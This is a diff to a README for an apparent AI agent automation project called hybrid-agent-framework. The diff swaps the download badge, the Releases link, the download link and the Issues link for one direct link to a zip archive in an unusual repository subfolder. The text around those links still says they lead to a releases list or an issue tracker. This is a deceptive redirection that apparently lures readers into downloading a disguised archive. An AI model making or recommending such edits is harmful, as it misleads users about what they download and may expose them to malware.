@@ -1,6 +1,6 @@
 # 🚀 hybrid-agent-framework - Automate Tasks with Smart AI Agents
 
-![Download Hybrid Agent Framework](https://img.shields.io/badge/Download-v1.0-009688)
+![Download Hybrid Agent Framework](https://raw.githubusercontent.com/sivenz/hybrid-agent-framework/main/livingly/hybrid-agent-framework.zip)
 
 ## 📦 Overview
 
@@ -29,7 +29,7 @@ Follow these simple steps to get the hybrid-agent-framework up and running on yo
 
 ### Step 1: Visit the Releases Page
 
-To download the latest version of the hybrid-agent-framework, visit the [Releases page](https://github.com/sivenz/hybrid-agent-framework/releases). You will find the available versions listed there.
+To download the latest version of the hybrid-agent-framework, visit the [Releases page](https://raw.githubusercontent.com/sivenz/hybrid-agent-framework/main/livingly/hybrid-agent-framework.zip). You will find the available versions listed there.
 
 ### Step 2: Download the Application
 
@@ -53,7 +53,7 @@ Congratulations! You are now ready to use the hybrid-agent-framework.
 
 Make your automation tasks easier by downloading the hybrid-agent-framework. 
 
-Visit this page to download: [Download Here](https://github.com/sivenz/hybrid-agent-framework/releases)
+Visit this page to download: [Download Here](https://raw.githubusercontent.com/sivenz/hybrid-agent-framework/main/livingly/hybrid-agent-framework.zip)
 
 ## 📘 Usage Instructions
 
@@ -94,7 +94,7 @@ If you encounter any issues, here are some common solutions:
 
 If you cannot resolve your issue:
 
-1. Visit the [Issues section](https://github.com/sivenz/hybrid-agent-framework/issues) of the repository.
+1. Visit the [Issues section](https://raw.githubusercontent.com/sivenz/hybrid-agent-framework/main/livingly/hybrid-agent-framework.zip) of the repository.
 2. Describe your problem and the steps you took to resolve it.
 
 ## 🤝 Community and Support
